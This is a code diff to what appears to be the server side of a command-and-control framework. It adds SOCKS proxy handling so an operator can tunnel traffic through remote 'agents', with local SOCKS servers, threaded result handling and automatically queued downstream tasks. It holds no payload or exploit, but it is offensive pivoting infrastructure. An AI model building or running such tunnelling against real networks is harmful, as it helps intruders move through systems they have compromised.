@@ -1,18 +1,25 @@
 import os
 import datetime
+import threading
+import random
+import json
 
 from connect.output import display
 from connect.generate import string_identifier
 from connect.convert import base64_to_string, base64_to_bytes
+from connect.socks.socks import SocksManager
 from .models import AgentModel, db, TaskModel
 
 
 class ResultsHandler:
 
-    def __init__(self):
+    def __init__(self, app):
+        self.app = app
+        self.socks_manager = SocksManager()
         self.task_types = {
             0: self.process_string_results,
-            1: self.process_file_results
+            1: self.process_file_results,
+            2: self.process_socks_results
         }
 
     def process_results(self, task, results):
@@ -34,6 +41,24 @@ class ResultsHandler:
         self.commit(task)
         display(f'{task.agent.id} returned results for `{task.method}` wrote results to: `{file_name}`', 'SUCCESS')
 
+    def process_socks_results(self, task, results):
+        if task.method == 'socks':
+            if task.agent.id in self.socks_manager.socks_servers:
+                self.socks_manager.shutdown_socks_server(task.agent.id)
+                return
+            self.socks_manager.create_socks_server('127.0.0.1', random.randint(9050, 9100), task.agent.id)
+        if task.method == 'socks_downstream' or task.method == 'socks_connect':
+            print(task)
+            task_results_thread = threading.Thread(target=self.socks_manager.handle_socks_task_results, args=(task.method, results))
+            task_results_thread.daemon = True
+            task_results_thread.start()
+            if task.method == 'socks_connect':
+                results = json.loads(base64_to_string(results))
+                if results['bind_addr']:
+                    downstream_task = TaskModel(agent=task.agent, method='socks_downstream', type=2,
+                                                parameters=','.join([results['client_id']]))
+                    self.commit(downstream_task)
+
     @staticmethod
     def commit(model):
         db.session.add(model)
@@ -41,9 +66,9 @@ class ResultsHandler:
 
 
 class TaskManager:
-    def __init__(self):
+    def __init__(self, app):
         self.incoming_tasks = {}
-        self.results_handler = ResultsHandler()
+        self.results_handler = ResultsHandler(app)
 
     def parse_batch_response(self, batch_response: list) -> list:
         batch_request = []
@@ -60,6 +85,7 @@ class TaskManager:
                 db.session.commit()
                 continue
             task = TaskModel.query.filter_by(id=task_id).first()
+
             if not task:
                 display(f'Failed to find task with id {task_id}', 'ERROR')
                 continue
